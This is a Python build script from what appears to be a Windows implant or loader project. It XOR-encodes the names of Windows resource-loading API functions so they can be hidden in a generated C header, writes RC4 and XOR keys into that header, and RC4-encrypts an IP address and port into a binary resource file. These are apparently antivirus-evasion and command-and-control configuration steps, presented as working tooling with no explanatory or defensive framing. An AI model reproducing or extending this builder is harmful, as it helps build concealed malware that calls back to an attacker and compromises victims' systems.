import struct
from Crypto.Cipher import ARC4
import json
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)


fpathConfig = PROJECT_ROOT + r"\resources\config.json"
fpathKeyHead = PROJECT_ROOT + r"\src\Headers\key.h"
fpathConfigBin = PROJECT_ROOT + r"\resources\config.bin"

def xorCrypt(buffer: bytes, key: int):
    crypted = b''
    for i in buffer:
        crypted += (bytes([i ^ key]))
    return crypted


with open(fpathConfig, "r") as f:
    conf = json.load(f)

key = bytes.fromhex(conf["rc4_key"])
xor_key = conf["xor_key"]

encApis = [b'FindResourceA\x00', b'LoadResource\x00', b'LockResource\x00', b'SizeofResource\x00']
encApisCString = [xorCrypt(api, xor_key) for api in encApis]
encApisCString = [
    "{" + ''.join(f'{hex(b)}, ' for b in api).rstrip(', ') + '};'
    for api in encApisCString
]


with open(fpathKeyHead, "w") as f:
    escaped = ''.join(f'{hex(b)}, ' for b in key)
    f.write("#pragma once\n")
    f.write(f'static const unsigned char RC4_KEY[] = {{ {escaped}}};\n')
    f.write(f'#define XOR_KEY {hex(xor_key)}\n')
    for i, api in enumerate(encApisCString):
        f.write(f"static BYTE psz{encApis[i].decode()[:-1]}[] = {api}\n")

ip = conf["ip"].encode()
ip = ip + (b'\x00' * (16 - len(ip)))
port = struct.pack("<h", conf["port"])
config = ip + port
cipher = ARC4.new(key)
encConfig = cipher.encrypt(config)
with open(fpathConfigBin, 'wb') as f:
    f.write(encConfig)
print("Updated the config")